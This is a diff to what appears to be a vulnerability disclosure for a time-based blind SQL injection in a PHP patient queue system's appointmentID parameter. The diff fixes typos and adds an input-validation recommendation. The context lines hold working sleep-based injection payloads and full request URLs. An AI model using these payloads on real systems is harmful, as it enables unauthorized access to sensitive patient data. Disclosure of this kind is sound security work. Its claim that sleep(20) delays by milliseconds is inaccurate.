@@ -73,7 +73,7 @@ pqms/php/api_patient_schedule.php?appointmentID
    AppointmentId: '%2b(select*from(select(sleep(0)))a)%2b'
    ```
    
-7. Attacker can manuplate the database to delay in 0 milli-second and access the unauthorized sensitive information.
+7. Attacker can manipulate the database to delay in 0 milli-second and access the unauthorized sensitive information.
    ```
    http://localhost/pqms/php/api_patient_schedule.php?appointmentID='%2b(select*from(select(sleep(0)))a)%2b'
    ``` 
@@ -84,11 +84,12 @@ pqms/php/api_patient_schedule.php?appointmentID
    AppointmentId: '%2b(select*from(select(sleep(20)))a)%2b'
    ```
 
-9. Attacker can manuplate the database to delay in 20 milli-seconds and access the unauthorized sensitive information.
+9. Attacker can manipulate the database to delay in 20 milli-seconds and access the unauthorized sensitive information.
    ```
    http://localhost/pqms/php/api_patient_schedule.php?appointmentID='%2b(select*from(select(sleep(20)))a)%2b'
    ``` 
    ![Description of image](20260218-pqms-006.png)
 
-
+## Recommendations:
+It is recommended to apply the input validation for protecting the application from this attack vector.
 
